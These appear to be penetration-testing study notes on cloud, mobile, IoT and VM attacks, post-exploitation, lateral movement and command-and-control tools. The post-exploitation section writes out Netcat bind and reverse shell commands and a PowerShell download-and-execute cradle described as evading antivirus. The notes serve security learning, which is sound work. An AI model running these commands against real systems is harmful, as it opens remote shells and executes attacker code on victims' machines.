
Many attacks against cloud technologies are possible, and the following are just some of them:

- Credential harvesting
- Privilege escalation
- Account takeover
- Metadata service attacks
- Attacks against misconfigured cloud assets
- Resource exhaustion and denial-of-service (DoS) attacks
- Cloud malware injection attacks
- Side-channel attacks
- Direct-to-origin attacks
**_Credential harvesting_** is not a new attack type, but the methodologies used by attackers have evolved throughout the years. Credential harvesting (or password harvesting) is the act of gathering and stealing valid usernames, passwords, tokens, PINs, and any other types of credentials through infrastructure breaches.

**_Privilege escalation_** is the act of exploiting a bug or design flaw in a software or firmware application to gain access to resources that normally would have been protected from an application or a user

_Vertical privilege escalation_, also called privilege elevation, occurs when a lower-privileged user accesses functions reserved for higher-privileged users (for example, a standard user accessing functions of an administrator). To protect against this situation, you should update the network device firmware. In the case of an operating system, it should again be updated. The use of some type of access control system – for example, User Account Control (UAC)–is also advisable.

_Horizontal privilege escalation_ occurs when a normal user accesses functions or content reserved for other normal users (for example, one user reading another’s email). This can be done through hacking or by a person walking over to someone else’s computer and simply reading their email. Always have your users lock their computer (or log off) when they are not physically at their desk.

In an **_account takeover_**, the threat actor gains access to a user or application account and uses it to then gain access to more accounts and information. There are different ways that an account takeover can happen in the cloud
There are a number of ways to detect account takeover attacks. Select each for more detail.
- The location of the user can clue you in to a takeover. For instance, you may not do business in certain geographic locations and countries. You can prevent a user from logging in from IP addresses that reside in those locations. Keep in mind, however, that an attacker can easily use a VPN to bypass this restriction.
- It is now fairly easy to detect and block failed login attempts from a user or an attacker.
- These are phishing emails that originate from an account that has already been compromised by the attacker.
- An attacker could create a fake application that could require read, write, and send permissions for email SaaS offerings such as Office 365 and Gmail. Once the application is granted permission by the user to “connect” and authenticate to these services, the attacker could manipulate it
- An attacker could create a fake application that could require read, write, and send permissions for email SaaS offerings such as Office 365 and Gmail. Once the application is granted permission by the user to “connect” and authenticate to these services, the attacker could manipulate it.
#lookup 
>By using tools such as nimbostratus ([_https://github.com/andresriancho/nimbostratus_](https://github.com/andresriancho/nimbostratus)), you can find vulnerabilities that could lead to **_metadata service attacks_**.

Federated authentication (or federated identity) is a method of associating a user’s identity across different identity management systems. For example, every time you access a website, a web application, or a mobile application that allows you to log in or register with your Facebook, Google, or Twitter account, that application is using federated authentication.

 _Typosquatting_ is a technique that leverages human error when typing URLs in a web browser or accessing other resources (as in the earlier example of impersonating legitimate Docker containers in Docker Hub).

However, attackers can launch more strategic DoS attacks against applications hosted in the cloud that could lead to _resource exhaustion_. For example, they can leverage a single-packet DoS vulnerability in network equipment used in cloud environments, or they can leverage tools to generate crafted packets to cause an application to crash. For instance, you can search in Exploit Database (exploit-db.com) for exploits that can be used to leverage “denial of service” vulnerabilities, where an attacker could just send a few packets and crash an application or the whole operating system.  search for exploits using the **searchsploit** tool.

Another example of a DoS attack that can affect cloud environments is the **_direct-to-origin_** **_(D2O)_** **_attack_**. In a D2O attack, threat actors are able to reveal the origin network or IP address behind a content delivery network (CDN) or large proxy placed in front of web services in a cloud provider. A D2O attack could allow attackers to bypass different anti-DDoS mitigations.

**_Side-channel attacks_** are often based on information gained from the implementation of the underlying computer system (or cloud environment) instead of a specific weakness in the implemented technology or algorithm.

#lookup 
>Examples of vulnerabilities that could lead to side-channel attacks are the Spectre and Meltdown vulnerabilities affecting Intel, AMD, and ARM processors. Cloud providers that use Intel CPUs in their virtualized solutions could be affected by these vulnerabilities if they do not apply the appropriate patches. You can find information about Spectre and Meltdown at [_https://spectreattack.com_](https://spectreattack.com/).

The following site provides detailed information on how to get started with the AWS CDK: [_https://docs.aws.amazon.com/cdk/latest/guide/getting_started.html_](https://docs.aws.amazon.com/cdk/latest/guide/getting_started.html)

### Reverse Engineering

The process of analyzing the compiled mobile app to extract information about its source code could be used to understand the underlying architecture of a mobile application and potentially manipulate the mobile device. Attackers use reverse engineering techniques to compromise the mobile device operating system (for example, Android, Apple iOS) and root or jailbreak mobile devices.

**NOTE** OWASP has different “crack-me” exercises that help you practice reverse engineering of Android and iOS applications. See [_https://github.com/OWASP/owasp-mstg/tree/master/Crackmes_](https://github.com/OWASP/owasp-mstg/tree/master/Crackmes).


### Sandbox Analysis

iOS and Android apps are isolated from each other via sandbox environments. Sandboxes in mobile devices are a mandatory access control mechanism describing the resources that a mobile app can and can’t access. Android and iOS provide different interprocess communication (IPC) options for mobile applications to communicate with the underlying operating system. An attacker could perform detailed analysis of the sandbox implementation in a mobile device to potentially bypass the access control mechanisms implemented by Google (Android) or Apple (iOS), as well as mobile app developers.

### Spamming

Unsolicited messages are a problem with email and with text messages and other mobile messaging applications as well.  SMS phishing attacks, which continue to be some of the most common attacks against mobile users. In such an attack, a user may be presented with links that could redirect to malicious sites to steal sensitive information or install malware.

OWASP provides guidance on how to test iOS local authentication at [_https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md_](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md).

Attackers use certificate pinning to associate a mobile app with a particular digital certificate of a server. The purpose is to avoid accepting any certificate signed by a trusted certificate authority (CA). The idea is to force the mobile app to store the server certificate or public key and subsequently establish connections only to the trusted/known server (referred to as “pinning” the server). The goal of certificate pinning is to reduce the attack surface by removing the trust in external CAs.

Attackers have tried to bypass certificate pinning by jailbreaking mobile devices and using utilities such as SSL Kill Switch 2 (see [_https://github.com/nabla-c0d3/ssl-kill-switch2_](https://github.com/nabla-c0d3/ssl-kill-switch2)) or Burp Suite Mobile Assistant app or by using binary patching and replacing the digital certificate.

#lookup 
- _Drozer_This Android testing platform and framework provides access to numerous exploits that can be used to attack Android platforms. You can download Drozer from [_https://labs.withsecure.com/tools/drozer_](https://labs.withsecure.com/tools/drozer).
- _Burpsuit_  can also be used to test mobile applications and determine how they communicate with web services and APIs. You can download Burp Suite from [_https://portswigger.net/burp_](https://portswigger.net/burp).
- _needle_ This open-source framework is used to test the security of iOS applications. You can download needle from [_https://github.com/WithSecureLabs/needle_](https://github.com/WithSecureLabs/needle).
- _MobSF_ is an automated mobile application and malware analysis framework. You can download it from [_https://github.com/MobSF/Mobile-Security-Framework-MobSF_](https://github.com/MobSF/Mobile-Security-Framework-MobSF).
- _Ettercap_ This tool is used to perform on-path attacks. You can download Ettercap from [_https://www.ettercap-project.org_](https://www.ettercap-project.org/). An alternative tool to Ettercap, called Bettercap, is available at [_https://www.bettercap.org_](https://www.bettercap.org/).
- _Frida_ is a dynamic instrumentation toolkit for security researchers and reverse engineers. You can download it from [_https://frida.re_](https://frida.re/)
- _Objection_ This runtime mobile platform and app exploration toolkit uses Frida behind the scenes. You can use Objection to bypass certificate pinning, dump keychains, perform memory analysis, and launch other mobile attacks. You can download Objection from [_https://github.com/sensepost/objection_](https://github.com/sensepost/objection).
- _ApkX_ This tool enables you to decompile Android application package (APK) files. You can download it from [_https://github.com/b-mueller/apkx_](https://github.com/b-mueller/apkx).
- _APK Studio_ You can use this tool to reverse engineer Android applications. You can download APK Studio from [_https://github.com/vaibhavpandeyvpz/apkstudio_](https://github.com/vaibhavpandeyvpz/apkstudio).

### Attacking Internet of Things (IoT) Devices
IoT protocols is important for tasks such as reconnaissance as well as exploitation. On the other hand, in the IoT world, you will frequently encounter custom, proprietary, or new network protocols. Some of the most common network protocols for IoT implementations include the following:

- Wi-Fi
- Bluetooth and Bluetooth Low Energy (BLE)
- Zigbee
- Z-Wave
- LoraWAN
- Insteon
- Modbus
- Siemens S7comm (S7 Communication)
For instance, **_Bluetooth Low Energy (BLE)_** is used by IoT home devices, medical, industrial, and government equipment. You can analyze protocols such as BLE by using specialized antennas and equipment such as the Ubertooth One ([_https://greatscottgadgets.com/ubertoothone/_](https://greatscottgadgets.com/ubertoothone/)). BLE involves a three-phase process to establish a connection:

**Phase 1**. Pairing feature exchange
**Phase 2**. Short-term key generation
**Phase 3**. Transport-specific key distribution

#lookup 
>Tools such as GATTacker ([_https://github.com/securing/gattacker_](https://github.com/securing/gattacker)) can be used to perform on-path attacks in BLE implementations. BtleJuice ([_https://github.com/DigitalSecurity/BtleJuice_](https://github.com/DigitalSecurity/BtleJuice)) is a framework for performing interception and manipulation of BLE traffic.

Many IoT, ICS, and SCADA systems should never be exposed to the Internet (see [_https://www.shodan.io/explore/category/industrial-control-systems_](https://www.shodan.io/explore/category/industrial-control-systems)). For example, programmable logic controllers (PLCs) controlling turbines in a power plant, the lighting at a stadium, and robots in a factory should never be exposed to the Internet. However, you can often see such systems in Shodan scan results.

Input validation vulnerabilities in protocols such as Modbus, S7 Communication, DNP3, and Zigbee could lead to DoS and code execution.

The **_Intelligent Platform Management Interface (IPMI)_** is a collection of compute interface specifications (often used by IoT systems) designed to offer management and monitoring capabilities independently of the host system’s CPU, firmware, and operating system. System administrators can use IPMI to enable out-of-band management of computer systems (including IoT systems) and to monitor their operation

### Exploiting Virtual Machines

The hypervisor is the entity that controls and manages the VMs. There are two types of hypervisors:

- Type 1 hypervisors (also known as native or bare-metal hypervisors) run directly on the physical (bare-metal) system. Examples of Type 1 hypervisors include VMware ESXi, Proxmox Virtual Environment, Xen, and Microsoft Hyper-V.
- Type 2, or hosted, hypervisors run on top of other operating systems. Examples of type 2 hypervisors include VirtualBox and VMware Player or Workstation.

- **Hypervisor vulnerabilities such as hyperjacking:** _Hyperjacking_ is a vulnerability that could allow an attacker to control the hypervisor. Hyperjacking attacks often require the installation of a malicious (or “fake”) hypervisor that can manage the entire virtual environment. The compromised or fake hypervisor operates in a stealth mode, avoiding detection. Hyperjacking attacks can be launched by injecting a rogue hypervisor beneath the original hypervisor or by directly obtaining control of the original hypervisor. You can also launch a hyperjacking attack by running a rogue hypervisor on top of an existing hypervisor.
- **VM repository vulnerabilities:** Attackers can leverage these vulnerabilities to compromise many systems and applications. There are many public and private VM repositories that users can leverage to deploy VMs, including different operating systems, development tools, databases, and other solutions. Examples include the VMware Marketplace ([_https://marketplace.cloud.vmware.com/_](https://marketplace.cloud.vmware.com/)) and AWS Marketplace ([_https://aws.amazon.com/marketplace_](https://aws.amazon.com/marketplace)). Attackers have found ways to upload fake or impersonated VMs with malicious software and backdoors. These ready-to-use VMs are deployed by many organizations, allowing the attacker to manipulate the user’s systems, applications, and data.
#lookup 
>The CIS Benchmarks for Docker and Kubernetes provide detailed guidance on how to secure Docker containers and Kubernetes deployments. You can access all the CIS Benchmarks at: [_https://www.cisecurity.org/cis-benchmarks_](https://www.cisecurity.org/cis-benchmarks).

A number of tools allow you to scan Docker images for vulnerabilities and assess Kubernetes deployments. The following are a few examples of these tools. Select each tool for more information.
- Grype is an open-source container vulnerability scanner that you can download from [_https://github.com/anchore/grype_](https://github.com/anchore/grype).
- Clair is another open-source container vulnerability scanner. You can download it from [_https://github.com/quay/clair_](https://github.com/quay/clair).
- Dagda This set of open-source static analysis tools can help detect vulnerabilities, Trojans, backdoors, and malware in Docker images and containers. It uses the ClamAV antivirus engine to detect malware and vulnerabilities. You can download Dagda from [_https://github.com/eliasgranderubio/dagda/_](https://github.com/eliasgranderubio/dagda/).
- Kube-bench This open-source tool performs a security assessment of Kubernetes clusters based on the CIS Kubernetes Benchmark. You can download kube-bench from [_https://github.com/aquasecurity/kube-bench_](https://github.com/aquasecurity/kube-bench).
- Kube-hunter : This open-source tool is designed to check the security posture of Kubernetes clusters. You can download kube-hunter from [_https://kube-hunter.aquasec.com/_](https://kube-hunter.aquasec.com/).
- Falco : You can download this threat detection engine for Kubernetes from [_https://falco.org/_](https://falco.org/).

 you need to maintain a foothold in a compromised system to perform additional tasks, such as installing and/or modifying services to connect back to the compromised system. You can maintain the persistence of a compromised system in a number of ways, including the following:

- Creating a bind or reverse shell
- Creating and manipulating scheduled jobs and tasks
- Creating custom daemons and processes
- Creating new users
- Creating additional backdoors
When you maintain persistence in a compromised system, you can take several actions, such as the following:

- Uploading additional tools
- Using local system tools
- Performing ARP scans and ping sweeps
- Conducting DNS and directory services enumeration
- Launching brute-force attacks
- Performing additional enumeration of users, groups, forests, sensitive data, and unencrypted files
- Performing system manipulation using management protocols (for example, WinRM, WMI, SMB, SNMP) and compromised credentials
- Executing additional exploits
You can also take several actions through the compromised system, including the following:

- Configuring port forwarding
- Creating SSH tunnels or proxies to communicate to the internal network
- Using a VPN to access the internal network

With a bind shell, an attacker opens a port or a listener on the compromised system and waits for a connection. This is done in order to connect to the victim from any system and execute commands and further manipulate the victim.

A reverse shell is a vulnerability in which an attacking system has a listener (port open), and the victim initiates a connection back to the attacking system.

#lookup 
Many tools allow you to create bind and reverse shells from a compromised host. Some of the most popular ones are the Meterpreter module in Metasploit and Netcat. Netcat is one of the best and most versatile tools for pen testers because it is lightweight and very portable. In Windows systems, you can execute the cmd.exe command prompt utility with the `nc -lvp 1234 -e cmd.exe` Netcat command.

One of the challenges of using bind shells is that if the victim’s system is behind a firewall, the listening port might be blocked. However, if the victim’s system can initiate a connection to the attacking system on a given port, a reverse shell can be used to overcome this challenge.

Attacking system creates a reverse shell by first using the **nc -lvp 777** command to listen to a specific port (port 777) on the attacking machine. Then on the compromised host (the victim), you inject and execute the **nc 192.168.78.145 777 -e /bin/bash** command to establish a connection with the attacking system. Once the victim system (192.168.78.4) is connected to the attacking system (192.168.78.145), commands can be executed in the bash shell of the victim by the attacker.

![[Pasted image 20251112171958.png]]

#lookup 
>Metasploit Unleashed is a free detailed Metasploit course released by Offensive Security. The course can be accessed at [_https://www.offensive-security.com/metasploit-unleashed_](https://www.offensive-security.com/metasploit-unleashed).

#lookup 
> _Common Meterpreter Commands_ cheet sheet : https://gist.github.com/ImaginaryBIT/8cd591b495c8f310428085c0448b0acf

**_Lateral movement_** (also referred to as _pivoting_) is a post-exploitation technique that can be performed using many different methods. The main goal of lateral movement is to move from one device to another to avoid detection, steal sensitive data, and maintain access to the devices to exfiltrate the **_sensitive data_**

**_Data exfiltration_** is the act of deliberately moving sensitive data from inside an organization to outside an organization’s perimeter without permission. In this section, you will learn the most common techniques for lateral movement.

Pass-the-hash is an example of a post-exploitation technique that can be used to move laterally and compromise other systems in the network. Because password hashes cannot be reversed, instead of trying to figure out what the user’s password is, an attacker can just use a password hash collected from a compromised system and then use the same hash to log in to another client

Many different legitimate Windows legitimate utilities, such as PowerShell, Windows Management Instrumentation (WMI), and Sysinternals, can be used for post-exploitation activities

Using legitimate tools to perform post-exploitation activities is often referred to as **_living-off-the-land_**

Examples of living-off-the-land post-exploitation techniques include the following:

- PowerShell for Post-Exploitation Tasks
- PowerSploit and Empire
- BloodHound
- Windows Management Instrumentation for Post-Exploitation Tasks
- Sysinternals and PsExec
- Windows Remote Management (WinRM) for Post-Exploitation Tasks

The following PowerShell command can be used to avoid detection by security products and antivirus software:
```
PS > IEX (New-Object Net.WebClient).DownloadString('http:// /Invoke-PowerShellTcp.ps1')
```
This command directly loads a PS1 file from the Internet instead of downloading it and then executes it on the device.
Remote management in Windows via PowerShell (often called **_PowerShell [PS] remoting_** ) is a basic feature that a system administrator can use to access and manage a system remotely. An attacker could also take advantage of this feature to perform post-exploitation activities.

#lookup 
>For details on how to enable PowerShell remoting, see [_https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting).

PowerSploit is a collection of PowerShell modules that can be used for post-exploitation and other phases of an assessment. Table 8- 5 lists the most popular PowerSploit modules and scripts. Refer to [_https://github.com/PowerShellMafia/PowerSploit_](https://github.com/PowerShellMafia/PowerSploit) for a complete and up-to-date list of scripts.

 **_Empire_**, which is an open-source framework that includes a PowerShell Windows agent and a Python Linux agent. Empire implements the ability to run PowerShell agents without the need for powershell.exe. It allows you to rapidly deploy post-exploitation modules including keyloggers, **_bind shells_**, **_reverse shells_**, **_Mimikatz_**, and adaptable communications to evade detection. You can download Empire from [_https://github.com/EmpireProject/Empire_](https://github.com/EmpireProject/Empire).
 
 **Blood hound**: You can use a single-page JavaScript web application called **_BloodHound_** that uses graph theory to reveal the hidden relationships in a Windows Active Directory environment. An attacker can use BloodHound to identify numerous attack paths. Similarly, incident response teams can use BloodHound to detect and eliminate those same attack paths. You can download BloodHound from the following GitHub repository: [_https://github.com/BloodHoundAD/Bloodhound_](https://github.com/BloodHoundAD/Bloodhound).
 
**_Windows Management Instrumentation (WMI)_** is used to manage data and operations on Windows operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers. WMI also provides functionality for data management to other parts of the operating system, including the System Center Operations Manager (formerly Microsoft Operations Manager [MOM]) and Windows Remote Management (WinRM). Malware can use WMI to perform different activities in a compromised system. For example, the Nyeta ransomware used WMI to perform administrative tasks.

**Sysinternals and PsExec**

Sysinternals is a suite of tools that allows administrators to control Windows-based computers from a remote terminal. You can use Sysinternals to upload, execute, and interact with executables on compromised hosts. The entire suite works from a command-line interface and can be scripted. By using Sysinternals, you can run commands that can reveal information about running processes, and you can kill or stop services. Penetration testers commonly use the following Sysinternals tools post-exploitation:

- **PsExec:** Executes processes
- **PsFile:** Shows open files
- **PsGetSid:** Displays security identifiers of users
- **PsInfo:** Gives detailed information about a computer
- **PsKill:** Kills processes
- **PsList:** Lists information about processes
- **PsLoggedOn:** Lists logged-in accounts
- **PsLogList:** Pulls event logs
- **PsPassword:** Changes passwords
- **PsPing:** Starts ping requests
- **PsService:** Makes changes to Windows services
- **PsShutdown:** Shuts down a computer
- **PsSuspend:** Suspends processes

**_PsExec_** is one of the most powerful Sysinternals tools. You can use it to remotely execute anything that can run on a Windows command prompt. You can also use PsExec to modify Windows registry values, execute scripts, and connect a compromised system to another system. For attackers, one advantage of PsExec is that the output of the commands you execute is shown on your system (the local system) instead of on the victim’s system. This allows an attacker to remain undetected by remote users.

**Windows Remote Management (WinRM) for Post-Exploitation Tasks**
**_Windows Remote Management (WinRM)_** gives you a legitimate way to connect to Windows systems. WinRM is typically managed by Windows Group Policy (which is typically used for managing corporate Windows environments).

BloodHound is a JavaScript web application that uses graph theory to reveal the hidden relationships in a Windows Active Directory environment. An attacker can use BloodHound to identify numerous attack paths. Similarly, incident response teams can use BloodHound to detect and eliminate those same attack paths.

![[Pasted image 20251112181208.png]]
![[Pasted image 20251112181334.png]]

**_privilege escalation_** is the act of gaining access to resources that normally would be protected from an application or a user.

After compromising a system during a penetration testing engagement, you should always cover your tracks to avoid detection by suppressing logs (when possible), deleting user accounts that could have been created on the system, and deleting any files that were created. In addition, after a penetration testing engagement is complete, you should clean up all systems.

The following are a few best practices to keep in mind during the cleanup process:

- Delete all user accounts used during the test.
- Delete all files, executable binaries, scripts, and temporary files from compromised systems. A secure deletion method may be preferred. NIST Special Publication 800-88, Revision 1: “Guidelines for Media Sanitization,” provides guidance for media sanitation. This methodology should be discussed with your client and the owner of the affected systems.
- Return any modified systems and their configuration to their original values and parameters.
- Remove all backdoors, daemons, services, and rootkits installed.
- Remove all customer data from your systems, including attacking systems and any other support systems. Typically, you should do this after creating and delivering the penetration testing report to the client.

**Steganography**

Attackers can use steganography for obfuscation, evasion, and to cover their tracks. **_Steganography_** involves hiding a message or any other content inside an image or a video file. To accomplish this task, you can use tools such as **steghide**. You can easily install this tool in a Debian-based Linux system by using the command **sudo apt install steghide**.

Attackers often use command and control (often referred to as C2 or CnC) systems to send commands and instructions to compromised systems. The C2 can be the attacker’s system (for example, desktop, laptop) or a dedicated virtual or physical server. A C2 creates a covert channel with the compromised system. A **_covert channel_** is an adversarial technique that allows the attacker to transfer information objects between processes or systems that, according to a security policy, are not supposed to be allowed to communicate.

- socat : A C2 utility that can be used to create multiple reverse shells (see [_http://www.dest-unreach.org/socat_](http://www.dest-unreach.org/socat))
- wsc2: A Python-based C2 utility that uses WebSockets (see [_https://github.com/Arno0x/WSC2_](https://github.com/Arno0x/WSC2))
- WMImplant : A PowerShell-based tool that leverages WMI to create a C2 channel (see [_https://github.com/ChrisTruncer/WMImplant_](https://github.com/ChrisTruncer/WMImplant))
- DropboxC2(DBC2) : A C2 utility that uses Dropbox (see [_https://github.com/Arno0x/DBC2_](https://github.com/Arno0x/DBC2))
- TrevorC2 : A Python-based C2 utility created by Dave Kennedy of TrustedSec (see [_https://github.com/trustedsec/trevorc2_](https://github.com/trustedsec/trevorc2))
- Twittor : A C2 utility that uses Twitter direct messages for command and control (see [_https://github.com/PaulSec/twittor_](https://github.com/PaulSec/twittor))
- DNSCat2: A DNS-based C2 utility that supports encryption and that has been used by malware, threat actors, and pen testers (see [_https://github.com/iagox86/dnscat2_](https://github.com/iagox86/dnscat2))

#lookup 
>A large number of open-source C2 and adversarial emulation tools are listed in The C2 Matrix, along with supported features, implant support, and other information, at [_https://www.thec2matrix.com_](https://www.thec2matrix.com/).

